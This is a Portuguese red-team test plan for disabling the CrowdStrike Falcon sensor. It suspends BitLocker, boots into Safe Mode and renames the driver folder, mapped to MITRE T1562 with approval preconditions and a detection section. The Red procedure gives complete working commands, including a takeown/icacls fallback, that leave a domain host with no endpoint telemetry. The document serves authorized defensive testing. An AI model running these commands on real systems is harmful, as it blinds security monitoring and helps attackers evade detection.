1. Contexto e finalidade
O que o TTP faz: desativa, degrada ou altera uma ferramenta de segurança para reduzir prevenção/observabilidade. Alvo: sensor Falcon. Resultado: de tentativa bloqueada até perda efetiva do sensor.

Cadeia: admin local → suspender BitLocker → Safe Mode → renomear pasta do driver → reboot normal → host "silencioso" no domínio.

Objetivos:

Proteção impede a remoção não autorizada?
SOC identifica ação admin → alteração do sensor → perda de telemetria/alerta de health?
Existe defesa em profundidade além do Falcon?
Por que importa: após o sensor morrer, o host permanece membro do domínio (identidade AD íntegra, autentica, recebe GPO). Gap = só visibilidade endpoint.

2. Fundamentação técnica
Anatomia do Falcon:

Driver kernel (mini-filter): C:\Windows\System32\drivers\CrowdStrike\CSAgent.sys
Serviço user-mode: csagent
Tamper protection: nega excluir/renomear arquivos próprios e bloquear stop do serviço; uninstall exige token do console.
Por que Safe Mode: o kernel carrega só drivers essenciais → Falcon não carrega → sem mini-filter/tamper → o arquivo fica "solto" e o ren funciona.

Por que renomear: o binário some do caminho → no boot normal o SCM não acha CSAgent.sys → serviço não inicia → sensor morto. Sem evento de uninstall, sem token, reversível.

Por que BitLocker: viabiliza manipulação offline, evita recovery no boot (mudança de BCD pode alterar medição do TPM) e é o primeiro dente de detecção (evento observável e anômalo).

3. Mapeamento
Tática	Technique	Uso
Defense Evasion	T1562	degradar EDR
Defense Evasion	T1562.001	renomear driver
Defense Evasion	T1562.009	Safe Mode Boot
Defense Evasion	T1562 (suporte)	suspender BitLocker
4. Pré-condições
ROE/janela aprovada + stop conditions
Host de teste (não produção), Falcon saudável
Admin local
Tamper protection habilitada + BitLocker habilitado (baseline registrado)
NTP sync + T0 (UTC) + telemetria confirmada + snapshot
Baseline:

manage-bde -status
sc query csagent
fltmc | findstr /i "crowd csagent"
bcdedit /enum {current}
Get-ChildItem C:\Windows\System32\drivers\CrowdStrike
5. Procedimento (Red)
# 1. Suspender BitLocker
manage-bde -protectors -disable C: -RebootCount 0
manage-bde -status                          # Protection Off

# 2. Safe Mode
bcdedit /set {current} safeboot minimal     # 'network' se precisar de rede

# 3. Reiniciar em Safe Mode
shutdown /r /t 0
# no Safe Mode:
sc query csagent                            # STOPPED
fltmc | findstr /i "crowd"                  # vazio

# 4. Renomear pasta do driver
ren C:\Windows\System32\drivers\CrowdStrike CrowdStrike.old
# contingência ACL:
takeown /f C:\Windows\System32\drivers\CrowdStrike /r /d y
icacls C:\Windows\System32\drivers\CrowdStrike /grant Administrators:F /t

# 5. Remover Safe Mode e reboot normal
bcdedit /deletevalue {current} safeboot
shutdown /r /t 0

# 6. Verificar objetivo
sc query csagent       # STOPPED / falha (binário ausente)
nltest /dsgetdc:       # retorna DC → ainda no domínio
whoami                 # DOMINIO\usuario
Prova: sensor sem heartbeat + identidade AD íntegra + sem alarme.

6. Variações
Variação	Efeito
safeboot network	rede no safe mode, mais ruído
move p/ %TEMP%	FileCreate/Delete em dois caminhos
del	sem rollback, evitar
msconfig/reg	menos dep. de bcdedit
net stop csagent	tamper normalmente bloqueia
7. Detecção (Blue)
Eventos Windows:

BitLocker: BitLocker Management — 776 (protetor removido), 782 (suspenso), 783 (retomado), 513 (protetores excluídos), 774/775 (descriptografia)
Sysmon EID 1: manage-bde.exe, bcdedit.exe (cmd com safeboot), cmd.exe /c ren
Sysmon EID 11 (rename) / EID 23 (delete) sob drivers\CrowdStrike
Security 4663/4660 (se SACL)
Falcon: tamper protection (prevenção), Sensor Tampering/Removal, RFM, heartbeat gap/offline.
